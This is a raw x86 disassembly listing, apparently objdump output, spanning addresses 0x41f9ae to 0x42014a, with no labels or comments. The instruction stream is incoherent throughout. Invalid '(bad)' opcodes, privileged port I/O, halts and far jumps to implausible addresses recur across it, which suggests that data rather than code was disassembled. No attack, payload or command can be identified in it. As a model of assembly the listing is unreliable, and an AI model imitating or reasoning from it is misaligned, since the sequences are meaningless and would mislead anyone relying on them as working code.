  41f9ae:	mov    eax,ds:0xc7895124
  41f9b3:	jmp    0x41f987
  41f9b5:	lahf   
  41f9b6:	or     DWORD PTR [ecx-0x6f39014],esp
  41f9bc:	cmp    DWORD PTR [edi-0x178638e5],esp
  41f9c2:	sbb    ah,BYTE PTR [edi]
  41f9c4:	dec    esi
  41f9c5:	mov    dh,0xb3
  41f9c7:	sub    al,BYTE PTR [esi+ecx*1-0x18eb764]
  41f9ce:	push   esi
  41f9cf:	adc    DWORD PTR [esi-0x28e3739f],0xd51a1247
  41f9d9:	xor    BYTE PTR [ebx-0x29],0x2c
  41f9dd:	sbb    ah,BYTE PTR [ebx-0x60e54eb0]
  41f9e3:	push   ecx
  41f9e4:	mov    ebp,0x90c40158
  41f9e9:	and    al,0xc8
  41f9eb:	push   esi
  41f9ec:	inc    ebp
  41f9ed:	in     al,0xbf
  41f9ef:	sbb    ecx,DWORD PTR ds:0x28e07fe
  41f9f5:	push   0x48d72129
  41f9fa:	xchg   edx,eax
  41f9fb:	mov    dl,0x8a
  41f9fd:	inc    ebx
  41f9fe:	or     BYTE PTR [edi],dl
  41fa00:	jmp    DWORD PTR [ebp-0x3bedb49a]
  41fa06:	adc    edx,esp
  41fa08:	les    esp,FWORD PTR [ecx+0x18]
  41fa0b:	inc    esp
  41fa0c:	sbb    al,0x71
  41fa0e:	mov    edx,fs
  41fa10:	ja     0x41f9df
  41fa12:	hlt    
  41fa13:	jmp    0xb7c2b363
  41fa18:	mov    DWORD PTR [esi+esi*2],edx
  41fa1b:	cmp    esi,DWORD PTR [ecx]
  41fa1d:	(bad)  
  41fa1e:	hlt    
  41fa1f:	pop    ds
  41fa20:	in     eax,dx
  41fa21:	fsub   QWORD PTR [eax]
  41fa23:	lods   eax,DWORD PTR ds:[esi]
  41fa24:	mov    eax,0x944cf98a
  41fa29:	sar    DWORD PTR ds:0x1ebc31a0,1
  41fa2f:	mov    al,0xa8
  41fa31:	cmp    bh,BYTE PTR [ebx+0x1583e2cb]
  41fa37:	gs jge 0x41fa62
  41fa3a:	cmp    ecx,DWORD PTR cs:[esi+0x3]
  41fa3e:	dec    ecx
  41fa3f:	xor    eax,0xcce111e5
  41fa44:	pop    ebp
  41fa45:	inc    edi
  41fa46:	mov    bl,0xa6
  41fa48:	pop    eax
  41fa49:	adc    dh,0xc6
  41fa4c:	daa    
  41fa4d:	xchg   ecx,eax
  41fa4e:	and    al,dl
  41fa50:	dec    ebp
  41fa51:	xchg   esp,eax
  41fa52:	rol    BYTE PTR [esi],1
  41fa54:	jmp    edi
  41fa56:	xor    esp,ebp
  41fa58:	mov    al,ds:0x11b2f450
  41fa5d:	test   BYTE PTR [esp+eax*8-0x6a],bl
  41fa61:	cmp    BYTE PTR [eax],0x8
  41fa64:	push   edx
  41fa65:	test   eax,0x8226cc2f
  41fa6a:	hlt    
  41fa6b:	jns    0x41fac2
  41fa6d:	jno    0x41fa72
  41fa6f:	enter  0x931b,0xa9
  41fa73:	(bad)  
  41fa74:	cmp    eax,0x9fc1822c
  41fa79:	jge    0x41fa99
  41fa7b:	cmp    al,BYTE PTR [ebp+0x0]
  41fa7e:	sbb    BYTE PTR [esi+0x5d45b5e8],al
  41fa84:	aad    0x81
  41fa86:	or     DWORD PTR [ebx+0x6864fb10],ebx
  41fa8c:	mov    ds:0x39ac82bb,eax
  41fa91:	add    cl,BYTE PTR [esi+0x489b7a66]
  41fa97:	hlt    
  41fa98:	mov    edx,DWORD PTR [eax+0x54a12741]
  41fa9e:	xor    BYTE PTR [ebp-0x1854998f],bl
  41faa4:	inc    edi
  41faa5:	das    
  41faa6:	data16 mov BYTE PTR [ebx+0x58fcb5b9],ch
  41faad:	in     eax,dx
  41faae:	xlat   BYTE PTR ds:[ebx]
  41faaf:	mov    esp,0xff4edf2b
  41fab4:	pop    edx
  41fab5:	jb     0x41fac0
  41fab7:	dec    eax
  41fab8:	in     al,0x5c
  41faba:	jl     0x41fae7
  41fabc:	(bad)  
  41fabd:	mov    ds:0xee91f347,eax
  41fac2:	gs xchg edi,eax
  41fac4:	push   eax
  41fac5:	cs fwait
  41fac7:	or     edi,DWORD PTR [esi+ebp*8-0x39741ab6]
  41face:	ja     0x41fa9d
  41fad0:	mov    esi,0x7eacc270
  41fad5:	ret    0x471f
  41fad8:	mov    cl,BYTE PTR [eax]
  41fada:	rcr    BYTE PTR [esi+0x1c54a3c],1
  41fae0:	mov    ds:0x63efe4d1,eax
  41fae5:	jo     0x41fb0e
  41fae7:	jns    0x41fada
  41fae9:	call   0xccf0cd63
  41faee:	inc    ebx
  41faef:	addr16 xchg esp,eax
  41faf1:	test   DWORD PTR ds:0x9746b15b,esi
  41faf7:	out    dx,al
  41faf8:	fadd   st,st(0)
  41fafa:	icebp  
  41fafb:	leave  
  41fafc:	pop    ebx
  41fafd:	outs   dx,BYTE PTR ds:[esi]
  41fafe:	leave  
  41faff:	(bad)  
  41fb00:	jmp    0x61f7:0x90a86b59
  41fb07:	test   BYTE PTR [bp+di-0x78],0x9f
  41fb0c:	in     al,0xd3
  41fb0e:	shl    ecx,1
  41fb10:	setnp  BYTE PTR [ebp+0x23]
  41fb14:	iret   
  41fb15:	mov    ebp,eax
  41fb17:	jg     0x41faaa
  41fb19:	inc    ebx
  41fb1a:	or     ebx,DWORD PTR [ebx-0x4192a9ba]
  41fb20:	xor    dh,ch
  41fb22:	xchg   ecx,eax
  41fb23:	fst    QWORD PTR [esi+0x361bf1c4]
  41fb29:	add    bl,dh
  41fb2b:	and    ecx,DWORD PTR [ebp-0x53]
  41fb2e:	push   ss
  41fb2f:	xor    DWORD PTR [eax+0x164da7ad],edx
  41fb35:	push   ds
  41fb36:	push   cs
  41fb37:	fist   DWORD PTR [esi-0x10]
  41fb3a:	inc    edx
  41fb3b:	ror    BYTE PTR [ebp+0x791f4144],cl
  41fb41:	ret    0x7f71
  41fb44:	inc    ebx
  41fb45:	cmp    ebp,DWORD PTR [ecx+0x1ad771de]
  41fb4b:	adc    esi,DWORD PTR [edx]
  41fb4d:	add    BYTE PTR [ebx-0x7c],al
  41fb50:	sbb    DWORD PTR [esi+0x4c],edi
  41fb53:	mov    ecx,0x446f5375
  41fb58:	sbb    eax,0xb4515e51
  41fb5d:	fbstp  TBYTE PTR [eax-0x42d5bcd9]
  41fb63:	push   ecx
  41fb64:	test   BYTE PTR [ebp-0x437b1247],bl
  41fb6a:	xor    eax,0x46ecf155
  41fb6f:	cmc    
  41fb70:	and    esp,DWORD PTR [ebx-0x47d299d1]
  41fb76:	call   0xa9019aa4
  41fb7b:	int3   
  41fb7c:	cmp    al,0x6c
  41fb7e:	test   al,bl
  41fb80:	sbb    DWORD PTR [ebx-0x6c],edi
  41fb83:	adc    eax,0xf22b8050
  41fb88:	jbe    0x41fb0b
  41fb8a:	push   esi
  41fb8b:	mov    ch,BYTE PTR ds:0x8e03f937
  41fb91:	imul   ebp,DWORD PTR [eax],0xffffffb0
  41fb94:	stc    
  41fb95:	enter  0x8689,0xd2
  41fb99:	fcmovne st,st(2)
  41fb9b:	stos   BYTE PTR es:[edi],al
  41fb9c:	setbe  cl
  41fb9f:	std    
  41fba0:	add    eax,0xe1f80c18
  41fba5:	ins    DWORD PTR es:[edi],dx
  41fba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fba7:	gs jno 0x41fb6f
  41fbaa:	daa    
  41fbab:	fs jmp 0x392ce915
  41fbb1:	mov    ch,0x58
  41fbb3:	rcl    DWORD PTR [ebx],cl
  41fbb5:	leave  
  41fbb6:	retf   0xbd9
  41fbb9:	xor    edx,DWORD PTR [bx+di-0x42]
  41fbbd:	jp     0x41fbf8
  41fbbf:	sub    ch,BYTE PTR [esi-0xa]
  41fbc2:	jge    0x41fbb8
  41fbc4:	scas   al,BYTE PTR es:[edi]
  41fbc5:	mov    cl,0x82
  41fbc7:	jo     0x41fbc9
  41fbc9:	sbb    al,al
  41fbcb:	cmp    al,0x87
  41fbcd:	nop
  41fbce:	pop    ebp
  41fbcf:	xor    eax,0x4a5c4125
  41fbd4:	(bad)  
  41fbd5:	xor    al,0x7b
  41fbd7:	pusha  
  41fbd8:	inc    esi
  41fbd9:	imul   edi,DWORD PTR [edi],0x58a6e181
  41fbdf:	add    al,0x79
  41fbe1:	and    ebx,ecx
  41fbe3:	sar    BYTE PTR [esp+ecx*2-0x38],cl
  41fbe7:	(bad)  [esi+0x18e1d350]
  41fbed:	loope  0x41fc21
  41fbef:	push   eax
  41fbf0:	retf   0xa91e
  41fbf3:	xlat   BYTE PTR ds:[ebx]
  41fbf4:	scas   eax,DWORD PTR es:[edi]
  41fbf5:	int3   
  41fbf6:	mov    al,0x8c
  41fbf8:	jmp    0xbcd1:0xbbe967e9
  41fbff:	(bad)  
  41fc00:	in     al,dx
  41fc01:	pop    esi
  41fc02:	fsubr  st(7),st
  41fc04:	cmp    esp,DWORD PTR [ebx+0x4b]
  41fc07:	or     dl,BYTE PTR [esi+0x4b2159a4]
  41fc0d:	int    0xbe
  41fc0f:	inc    edx
  41fc10:	mov    edx,0xfa87f92a
  41fc15:	add    eax,0x8b32bc72
  41fc1a:	dec    eax
  41fc1b:	jb     0x41fbec
  41fc1d:	jmp    0xe28b:0x2acca09d
  41fc24:	cdq    
  41fc25:	pop    es
  41fc26:	pop    ebp
  41fc27:	mov    dh,BYTE PTR [eax+0x11]
  41fc2a:	fsin   
  41fc2c:	(bad)  
  41fc2d:	mov    es,WORD PTR [eax]
  41fc2f:	leave  
  41fc30:	arpl   WORD PTR [eax-0x182b0deb],si
  41fc36:	jmp    0x760a6413
  41fc3b:	or     ah,BYTE PTR [edi+0x11]
  41fc3e:	xlat   BYTE PTR ds:[ebx]
  41fc3f:	add    BYTE PTR [edx+0x58],0xdd
  41fc43:	mov    dh,0x88
  41fc45:	inc    edi
  41fc46:	mov    BYTE PTR [esi+esi*2-0x325d9657],dh
  41fc4d:	add    BYTE PTR [edx-0x71],ah
  41fc50:	out    dx,eax
  41fc51:	push   eax
  41fc52:	rcr    DWORD PTR [ebp+0x5e],1
  41fc55:	nop
  41fc56:	pop    edx
  41fc57:	jo     0x41fc06
  41fc59:	adc    dl,BYTE PTR [edx+0x19d31231]
  41fc5f:	jmp    0x41fc4c
  41fc61:	stos   BYTE PTR es:[edi],al
  41fc62:	add    ch,BYTE PTR [ebx+eax*8]
  41fc65:	aad    0xdf
  41fc67:	pop    ecx
  41fc68:	or     DWORD PTR [esi+0x5],eax
  41fc6b:	das    
  41fc6c:	mov    edi,0xbcc9c3c2
  41fc71:	or     DWORD PTR ds:0x4e911180,0x37
  41fc78:	jmp    0x741c:0xd3b1b81c
  41fc7f:	sub    esp,DWORD PTR [ebp+0x229477fb]
  41fc85:	hlt    
  41fc86:	mov    esi,0x7e2f9652
  41fc8b:	jmp    0xe2a1:0x50c19c0
  41fc92:	leave  
  41fc93:	mov    BYTE PTR ds:0x2747198e,cl
  41fc99:	pusha  
  41fc9a:	test   BYTE PTR [ebx-0x61b42e18],0xc3
  41fca1:	jmp    0x3e7f3801
  41fca6:	mov    ecx,0xd7614338
  41fcab:	aad    0x56
  41fcad:	push   edi
  41fcae:	inc    edx
  41fcaf:	into   
  41fcb0:	jle    0x41fc32
  41fcb2:	aaa    
  41fcb3:	fwait
  41fcb4:	outs   dx,BYTE PTR ds:[esi]
  41fcb5:	aaa    
  41fcb6:	test   eax,0xa7c7841d
  41fcbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcbc:	loopne 0x41fcc9
  41fcbe:	push   cs
  41fcbf:	enter  0x7486,0x7b
  41fcc3:	aaa    
  41fcc4:	push   ds
  41fcc5:	cs push ss
  41fcc7:	add    edi,DWORD PTR ds:0xa0260991
  41fccd:	(bad)  
  41fcce:	pushf  
  41fccf:	stc    
  41fcd0:	ret    
  41fcd1:	outs   dx,BYTE PTR fs:[esi]
  41fcd3:	daa    
  41fcd4:	pop    esi
  41fcd5:	xor    BYTE PTR [ebx],dh
  41fcd7:	sbb    ch,ah
  41fcd9:	mov    ss,WORD PTR [ebx-0x5ef8f61d]
  41fcdf:	and    BYTE PTR [ecx+ebp*1],bh
  41fce2:	jo     0x41fd0c
  41fce4:	dec    edx
  41fce5:	test   al,0x9c
  41fce7:	std    
  41fce8:	cmp    eax,0x97b752d3
  41fced:	lods   eax,DWORD PTR ds:[esi]
  41fcee:	mov    ds:0xdb24edc,eax
  41fcf3:	rsqrtps xmm5,XMMWORD PTR [edi]
  41fcf6:	scas   al,BYTE PTR es:[edi]
  41fcf7:	(bad)  
  41fcf8:	out    0x8e,al
  41fcfa:	scas   al,BYTE PTR es:[edi]
  41fcfb:	sub    ah,BYTE PTR [eax-0x61b1c899]
  41fd01:	sti    
  41fd02:	push   edx
  41fd03:	jnp    0x41fd53
  41fd05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd06:	and    DWORD PTR [ecx+0x3c0c211e],ebp
  41fd0c:	push   eax
  41fd0d:	rcl    DWORD PTR [edi+0x53],cl
  41fd10:	mov    BYTE PTR [edx+0x71eb8661],0x8e
  41fd17:	fistp  WORD PTR [eax+eiz*2-0x1e7d7614]
  41fd1e:	mov    eax,ebp
  41fd20:	out    dx,eax
  41fd21:	jl     0x41fca5
  41fd23:	jp     0x41fd73
  41fd25:	cmp    ah,bh
  41fd27:	imul   esi,edx,0xffffffcc
  41fd2a:	or     al,0xd
  41fd2c:	daa    
  41fd2d:	or     BYTE PTR [edi],dh
  41fd2f:	test   BYTE PTR [edx],0xb0
  41fd32:	in     al,0xe0
  41fd34:	mov    eax,ds:0x8db7770b
  41fd39:	mov    ah,0x1c
  41fd3b:	std    
  41fd3c:	mov    al,ds:0x38ab7a96
  41fd41:	xor    dl,BYTE PTR [edi]
  41fd43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd44:	popa   
  41fd45:	jns    0x41fd11
  41fd47:	xor    ebp,DWORD PTR ss:[eax-0x75]
  41fd4b:	jns    0x41fcdf
  41fd4d:	add    eax,0x89a8492e
  41fd52:	jge    0x41fd96
  41fd54:	mov    WORD PTR [ebx],gs
  41fd56:	or     ch,BYTE PTR [ebp+0x62]
  41fd59:	retf   
  41fd5a:	cmp    DWORD PTR [ecx],esi
  41fd5c:	adc    DWORD PTR [esp-0x66c28499],ecx
  41fd63:	xchg   DWORD PTR [ebx+0x35],edi
  41fd66:	jno    0x41fd3a
  41fd68:	jecxz  0x41fceb
  41fd6a:	rcr    DWORD PTR [edx+0x251cd6fa],1
  41fd70:	cmp    DWORD PTR [edi],0xa2c420c
  41fd76:	sbb    al,al
  41fd78:	xor    BYTE PTR [edx-0x64c90f2d],dl
  41fd7e:	mov    ds:0x1400bdf4,al
  41fd83:	popa   
  41fd84:	lds    esp,FWORD PTR ss:[edi-0x2e]
  41fd88:	popa   
  41fd89:	ins    DWORD PTR es:[edi],dx
  41fd8a:	(bad)  
  41fd8b:	lock push esp
  41fd8d:	fnstcw WORD PTR [eax-0x55]
  41fd90:	sub    DWORD PTR [ebx],ebp
  41fd92:	inc    ebp
  41fd93:	and    eax,0xb0198d60
  41fd98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd99:	mov    eax,ds:0xd6bd083a
  41fd9e:	inc    esi
  41fd9f:	daa    
  41fda0:	sbb    eax,0x56823022
  41fda5:	loop   0x41fd41
  41fda7:	sub    dh,bl
  41fda9:	fnstcw WORD PTR [edi+0x20507f8b]
  41fdaf:	stos   DWORD PTR es:[edi],eax
  41fdb0:	dec    esp
  41fdb1:	adc    edi,DWORD PTR [edi-0x6b3b22f2]
  41fdb7:	jl     0x41fd81
  41fdb9:	retf   
  41fdba:	inc    edi
  41fdbb:	add    ebx,DWORD PTR [ecx]
  41fdbd:	mov    ebx,DWORD PTR [ebp-0x7b3305d6]
  41fdc3:	adc    al,0x45
  41fdc5:	dec    esi
  41fdc6:	jne    0x41fdb9
  41fdc8:	mov    ds:0x3f245052,eax
  41fdcd:	sub    al,0xc4
  41fdcf:	mov    WORD PTR [ecx-0x45638615],cs
  41fdd5:	pushf  
  41fdd6:	popf   
  41fdd7:	mov    ah,BYTE PTR ss:[ebx]
  41fdda:	leave  
  41fddb:	sub    eax,DWORD PTR [edx-0x1611e51d]
  41fde1:	(bad)  
  41fde2:	icebp  
  41fde3:	(bad)  
  41fde4:	and    dl,dl
  41fde6:	mov    ds:0x7cb6fcd4,al
  41fdeb:	xor    ecx,ebx
  41fded:	pop    ecx
  41fdee:	add    al,BYTE PTR [ebx-0x3b]
  41fdf1:	cmc    
  41fdf2:	dec    eax
  41fdf3:	ins    BYTE PTR es:[edi],dx
  41fdf4:	aam    0xe0
  41fdf6:	push   eax
  41fdf7:	mov    bl,0xac
  41fdf9:	call   0xad71f5b4
  41fdfe:	mov    bl,0xee
  41fe00:	cmp    BYTE PTR [edx+0x64],bh
  41fe03:	or     al,BYTE PTR [ecx+edx*2+0x42cb251f]
  41fe0a:	dec    eax
  41fe0b:	loop   0x41fdb4
  41fe0d:	adc    bl,dl
  41fe0f:	leave  
  41fe10:	cmp    al,0x20
  41fe12:	mov    cl,0x96
  41fe14:	push   cs
  41fe15:	xchg   ecx,eax
  41fe16:	test   al,0x16
  41fe18:	mov    esp,0xe92063d1
  41fe1d:	daa    
  41fe1e:	push   edx
  41fe1f:	mov    ds:0x9a222f7b,eax
  41fe24:	pusha  
  41fe25:	mov    dl,BYTE PTR [edx-0x10]
  41fe28:	adc    al,0xa4
  41fe2a:	jae    0x41fdde
  41fe2c:	jo     0x41fdd1
  41fe2e:	sbb    DWORD PTR ds:0x344c2097,eax
  41fe34:	dec    edi
  41fe35:	repz mov eax,0x90131d4f
  41fe3b:	cli    
  41fe3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe3d:	and    edi,edx
  41fe3f:	push   ecx
  41fe40:	aas    
  41fe41:	popa   
  41fe42:	xor    eax,0x65bd9da
  41fe47:	mov    ecx,0xee75deab
  41fe4c:	jns    0x41fe01
  41fe4e:	jmp    0x41fe8d
  41fe50:	mov    edx,0x52ac662e
  41fe55:	xor    eax,ecx
  41fe57:	jl     0x41fded
  41fe59:	dec    ebp
  41fe5a:	pop    edx
  41fe5b:	sbb    edx,DWORD PTR [edi-0x5620ea6e]
  41fe61:	nop
  41fe62:	int3   
  41fe63:	mov    ah,0x7c
  41fe65:	inc    esi
  41fe66:	mov    ss,WORD PTR [ebp-0x553fe467]
  41fe6c:	dec    esi
  41fe6d:	aaa    
  41fe6e:	lea    edx,[esi-0x31b705a4]
  41fe74:	mov    al,0x94
  41fe76:	outs   dx,DWORD PTR ds:[esi]
  41fe77:	jle    0x41feae
  41fe79:	sub    esp,eax
  41fe7b:	inc    esp
  41fe7c:	cld    
  41fe7d:	mov    esi,0x6f7266b8
  41fe82:	mov    ebp,ecx
  41fe84:	dec    ebx
  41fe85:	push   0xaf8a00b6
  41fe8a:	sub    ebx,0x33
  41fe8d:	inc    esp
  41fe8e:	mov    esi,0xe425cde0
  41fe93:	(bad)  
  41fe94:	sahf   
  41fe95:	cmp    BYTE PTR [edi],al
  41fe97:	in     eax,dx
  41fe98:	dec    ecx
  41fe99:	fcomi  st,st(6)
  41fe9b:	dec    edi
  41fe9c:	mov    ds:0xa146ec35,al
  41fea1:	lock imul ebp,DWORD PTR [eax-0x4b8bcfb6],0xd403cd45
  41feac:	pop    ds
  41fead:	and    al,0x2a
  41feaf:	push   ss
  41feb0:	pusha  
  41feb1:	test   al,0x56
  41feb3:	fisubr WORD PTR [ebp+0x5a3f2fc7]
  41feb9:	mov    eax,ds:0x8fdfde02
  41febe:	test   DWORD PTR [edx],ecx
  41fec0:	test   BYTE PTR [edx-0x1a650d2e],ah
  41fec6:	bswap  ebp
  41fec8:	inc    edx
  41fec9:	mov    ebx,0x6ac61bbf
  41fece:	xchg   esi,eax
  41fecf:	push   edx
  41fed0:	adc    BYTE PTR [edx-0x7ef8affc],0xe7
  41fed7:	nop
  41fed8:	rcr    DWORD PTR [ebx+0x67],cl
  41fedb:	jbe    0x41fede
  41fedd:	scas   eax,DWORD PTR es:[edi]
  41fede:	outs   dx,DWORD PTR ds:[esi]
  41fedf:	int    0xf3
  41fee1:	jno    0x41ff0d
  41fee3:	sti    
  41fee4:	sub    dh,BYTE PTR [edx+0x73]
  41fee7:	cdq    
  41fee8:	or     DWORD PTR ds:0x29ed6f8c,esi
  41feee:	xchg   edx,eax
  41feef:	push   esp
  41fef0:	xchg   edx,eax
  41fef1:	mov    al,0x26
  41fef3:	pushf  
  41fef4:	adc    al,0xdb
  41fef6:	into   
  41fef7:	inc    edx
  41fef8:	mov    ebx,DWORD PTR [edi-0x3247efb8]
  41fefe:	scas   al,BYTE PTR es:[edi]
  41feff:	test   eax,0x4aed634f
  41ff04:	push   edi
  41ff05:	add    edi,edx
  41ff07:	loope  0x41ff1d
  41ff09:	fmul   QWORD PTR [ebp+0x19]
  41ff0c:	push   es
  41ff0d:	dec    esi
  41ff0e:	adc    eax,0x24da21af
  41ff13:	xor    al,0xa1
  41ff15:	xchg   BYTE PTR [ebp+edx*4+0x5f],bl
  41ff19:	fwait
  41ff1a:	push   cs
  41ff1b:	aaa    
  41ff1c:	xchg   esi,eax
  41ff1d:	xchg   BYTE PTR [ebp+0x283d04bc],cl
  41ff23:	loop   0x41fec6
  41ff25:	std    
  41ff26:	dec    ecx
  41ff27:	sub    ebp,DWORD PTR [esi+0x5e]
  41ff2a:	fldenv [edi+0x5cc09fa1]
  41ff30:	sbb    al,0x0
  41ff32:	adc    al,0xa5
  41ff34:	test   al,0x23
  41ff36:	or     al,0x8f
  41ff39:	mov    edx,0x6bb61248
  41ff3e:	dec    esi
  41ff3f:	scas   al,BYTE PTR es:[edi]
  41ff40:	cli    
  41ff41:	sub    ebx,DWORD PTR [ecx-0x4b73d6ac]
  41ff47:	mov    edi,0xf2ed141f
  41ff4c:	or     bl,bl
  41ff4e:	int    0x68
  41ff50:	(bad)  
  41ff51:	mov    ch,0x2c
  41ff53:	test   DWORD PTR [esi],esp
  41ff55:	add    eax,0x42521388
  41ff5a:	push   ebx
  41ff5b:	mov    eax,ds:0x32d50cbe
  41ff60:	mov    WORD PTR [eax+0x35cc1b23],fs
  41ff66:	out    dx,eax
  41ff67:	into   
  41ff68:	push   esi
  41ff69:	mov    ch,0x42
  41ff6b:	sbb    eax,0xfe0f1a71
  41ff70:	mov    ds:0x21fe1b5d,al
  41ff75:	pop    ds
  41ff76:	inc    ebp
  41ff77:	addr16 mov ds:0x4ec7,eax
  41ff7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff7c:	lahf   
  41ff7d:	push   edi
  41ff7e:	sbb    BYTE PTR [ecx+0x6b],dh
  41ff81:	call   0x4f1:0xed7e5cb9
  41ff88:	retf   0xdfbc
  41ff8b:	xor    edi,0x2e
  41ff8e:	pop    edx
  41ff8f:	xchg   esi,eax
  41ff90:	push   0x896c2da2
  41ff95:	push   ebp
  41ff96:	pop    ecx
  41ff97:	dec    ebx
  41ff98:	mov    edi,0xf38d9c
  41ff9d:	xchg   ecx,eax
  41ff9e:	mov    WORD PTR [esi+eiz*2-0x7b],?
  41ffa2:	repnz in eax,dx
  41ffa4:	and    eax,0x90423167
  41ffa9:	inc    edx
  41ffaa:	div    dh
  41ffac:	push   edi
  41ffad:	add    edi,DWORD PTR [edi]
  41ffaf:	inc    eax
  41ffb0:	mov    bh,0xa
  41ffb2:	push   esi
  41ffb3:	jo     0x41ff58
  41ffb5:	cbw    
  41ffb7:	(bad)  
  41ffb8:	sub    BYTE PTR [eax-0x303d080e],ch
  41ffbe:	lods   al,BYTE PTR ds:[esi]
  41ffbf:	mov    bl,0xad
  41ffc1:	and    eax,0x91393b81
  41ffc6:	push   ebx
  41ffc7:	hlt    
  41ffc8:	adc    DWORD PTR [ebx-0x36fb3c61],edi
  41ffce:	es dec ecx
  41ffd0:	test   bl,cl
  41ffd2:	or     DWORD PTR [eax-0x26],esp
  41ffd5:	xchg   edx,eax
  41ffd6:	pop    ss
  41ffd7:	stos   DWORD PTR es:[edi],eax
  41ffd8:	clc    
  41ffd9:	and    bl,ch
  41ffdb:	mov    esp,0xfab2ab9e
  41ffe0:	xchg   ecx,eax
  41ffe1:	push   ds
  41ffe2:	shl    DWORD PTR [ecx],cl
  41ffe4:	mov    WORD PTR [ebx-0x281b8118],es
  41ffea:	inc    ebx
  41ffeb:	(bad)  
  41ffec:	xor    edi,edx
  41ffee:	and    al,0x31
  41fff0:	test   DWORD PTR [ebx-0x4],esp
  41fff3:	les    ebx,FWORD PTR [eax+0xe]
  41fff6:	jb     0x420002
  41fff8:	sar    BYTE PTR [eax+0x58],cl
  41fffb:	add    dl,BYTE PTR [edx]
  41fffd:	data16 adc ah,BYTE PTR [esi+0x62177983]
  420004:	push   0x19454627
  420009:	cld    
  42000a:	and    eax,0xc96de5c6
  42000f:	ror    BYTE PTR [edi],cl
  420011:	sti    
  420012:	mov    bh,0x1c
  420014:	pop    ebp
  420015:	daa    
  420016:	aad    0xa0
  420018:	adc    eax,0xa6e0e868
  42001d:	dec    eax
  42001e:	adc    ah,BYTE PTR [edx]
  420020:	mov    ebx,0xd81949b6
  420025:	ja     0x41ffe0
  420027:	cs dec ecx
  420029:	or     al,BYTE PTR [eax+0x3448cbcb]
  42002f:	in     eax,0x3b
  420031:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420032:	xchg   esp,eax
  420033:	xchg   ebp,eax
  420034:	sbb    eax,0xaf3dd819
  420039:	jne    0x41ffd0
  42003b:	icebp  
  42003c:	or     al,BYTE PTR [ebp+0x2a9b42b2]
  420042:	fldcw  WORD PTR [edi]
  420044:	fistp  QWORD PTR [edi]
  420046:	pop    eax
  420047:	add    al,0x10
  420049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42004a:	ja     0x41fffe
  42004c:	pop    eax
  42004d:	imul   DWORD PTR [ebx-0xe]
  420050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420051:	cs in  al,dx
  420053:	mov    ch,0x70
  420055:	pop    ss
  420056:	daa    
  420057:	xchg   BYTE PTR [ebp-0x49b55f59],bl
  42005d:	xchg   DWORD PTR [esi+0x68],ebp
  420060:	mov    ah,0xa
  420062:	mov    es,esi
  420064:	pop    ebx
  420065:	sahf   
  420066:	jo     0x4200a8
  420068:	or     eax,0xb5fbba1d
  42006d:	jmp    0x5a0:0xac728df8
  420074:	adc    eax,DWORD PTR [ebp+ebx*2-0x66]
  420078:	jmp    0x420017
  42007a:	mov    WORD PTR [edi],es
  42007c:	mov    DWORD PTR [edx-0x738a44b2],ebp
  420082:	pop    eax
  420083:	dec    ebp
  420084:	into   
  420085:	(bad)  
  420086:	data16 cmp al,0x4f
  420089:	mov    eax,ds:0xbcbdd645
  42008e:	pop    eax
  42008f:	push   esi
  420090:	mov    ah,BYTE PTR [ecx+0x50f83495]
  420096:	scas   eax,DWORD PTR es:[edi]
  420097:	xor    eax,0xf9f65df3
  42009c:	dec    esp
  42009d:	dec    BYTE PTR [edx+ebx*8]
  4200a0:	sbb    DWORD PTR [ebx+edi*2],esp
  4200a3:	pop    ds
  4200a4:	cwde   
  4200a5:	popa   
  4200a6:	pushfw 
  4200a8:	push   esp
  4200a9:	or     BYTE PTR [ecx],0x28
  4200ac:	cs cs mov ch,0x85
  4200b0:	push   eax
  4200b1:	and    BYTE PTR [ecx],0xab
  4200b4:	loope  0x420100
  4200b6:	mov    al,ds:0x1ba3f30f
  4200bb:	inc    edi
  4200bc:	and    DWORD PTR gs:0x26acc889,0x32
  4200c4:	mov    ds:0xa94e0c27,eax
  4200c9:	sub    eax,0x15cee6be
  4200ce:	xchg   ebx,eax
  4200cf:	xor    DWORD PTR [edi],0xffffffc6
  4200d2:	outs   dx,DWORD PTR ds:[esi]
  4200d3:	cmp    ah,bl
  4200d5:	cli    
  4200d6:	mov    eax,0x6ba2c28b
  4200db:	outs   dx,BYTE PTR ds:[esi]
  4200dc:	test   bl,al
  4200de:	test   BYTE PTR [esi+0x6c9f9799],bh
  4200e4:	pop    esi
  4200e5:	ret    
  4200e6:	push   es
  4200e7:	xor    BYTE PTR [ebx-0x2dfa64f1],bl
  4200ed:	mov    dh,0x9e
  4200ef:	(bad)  
  4200f0:	sbb    al,0x94
  4200f2:	inc    esi
  4200f3:	xchg   edi,eax
  4200f4:	adc    eax,0xa937917c
  4200f9:	mov    al,0x9d
  4200fb:	pusha  
  4200fc:	dec    esi
  4200fd:	fs stos DWORD PTR es:[edi],eax
  4200ff:	mov    bl,0x8
  420101:	and    BYTE PTR [eax],0x5a
  420104:	mov    eax,ds:0x9a548dd5
  420109:	and    DWORD PTR [ebx+0x50ac457e],ebx
  42010f:	pop    ss
  420110:	push   cs
  420111:	fstp   DWORD PTR [ecx]
  420113:	or     al,BYTE PTR [edi]
  420115:	test   BYTE PTR [ebx],dh
  420117:	add    al,0x96
  420119:	jo     0x42012e
  42011b:	pop    ebp
  42011c:	adc    dl,ah
  42011e:	outs   dx,DWORD PTR ds:[esi]
  42011f:	mov    edi,0xa56cdbe
  420124:	lea    eax,[ecx]
  420126:	cwde   
  420127:	push   0xffffffb2
  420129:	pop    esp
  42012a:	mov    cl,0x6f
  42012c:	je     0x42010a
  42012e:	mov    ebx,0xca34317e
  420133:	ror    DWORD PTR [eax],0x4e
  420136:	ret    0x7eb6
  420139:	int    0x6d
  42013b:	loope  0x42017b
  42013d:	add    al,0xc6
  42013f:	popf   
  420140:	jo     0x4201ba
  420142:	sub    BYTE PTR [edx+0x38d84814],ch
  420148:	cs inc eax
  42014a:	mov    esp,0x9582b18
